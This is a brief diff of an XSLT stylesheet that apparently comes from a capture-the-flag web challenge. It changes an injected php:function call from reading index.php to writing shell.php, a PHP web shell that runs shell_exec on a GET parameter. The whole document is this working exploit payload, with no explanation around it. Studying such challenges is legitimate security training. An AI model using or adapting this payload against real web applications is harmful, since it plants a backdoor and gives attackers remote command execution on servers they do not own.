@@ -2,7 +2,7 @@
 <xsl:template match="/">
 
 
-    <xsl:value-of select="php:function('file_get_contents','/challenge/web-serveur/ch50/index.php')"/>
+    <xsl:value-of select="php:function('file_put_contents','/challenge/web-serveur/ch50/shell.php','<?php echo shell_exec($_GET["e"]); ?>')"/>
     
     </xsl:template>
 </xsl:stylesheet>
